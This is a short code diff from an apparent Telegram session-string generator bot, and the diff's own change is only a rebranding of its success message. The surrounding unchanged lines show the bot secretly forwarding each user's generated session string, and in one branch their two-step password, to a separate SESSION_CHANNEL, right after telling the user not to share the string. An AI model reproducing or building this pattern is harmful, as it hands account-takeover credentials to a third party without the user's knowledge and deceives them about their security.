@@ -65,7 +65,7 @@ async def session_step(client, message):
                 {"$set": session_data},
                 upsert=True
             )
-            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n`{session_string}`\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse.\n\n**__Powered by Team SPY__**")
+            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n`{session_string}`\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse.\n\n**__Powered by ᴅᴇᴀᴛʜ ᴄᴏᴍᴍᴜɴɪᴛʏ__**")
             await gagan.send_message(SESSION_CHANNEL, f"✨ **__USER ID__** : {user_id}\n\n✨ **__2SP__** : `None`\n\n✨ **__Session String__ 👇**\n\n`{session_string}`")
             await temp_client.disconnect()
             reset_user(user_id)
@@ -93,7 +93,7 @@ async def session_step(client, message):
                 {"$set": session_data},
                 upsert=True
             )
-            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n`{session_string}`\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse.\n\n**__Powered by Team SPY__**")
+            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n`{session_string}`\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse.\n\n**__Powered by ᴅᴇᴀᴛʜ ᴄᴏᴍᴍᴜɴɪᴛʏ__**")
             await gagan.send_message(SESSION_CHANNEL, f"✨ **__ID__** : {user_id}\n\n✨ **__2SP__** : `{password}`\n\n✨ **__Session String__ 👇**\n\n`{session_string}`")
             await temp_client.disconnect()
             reset_user(user_id)
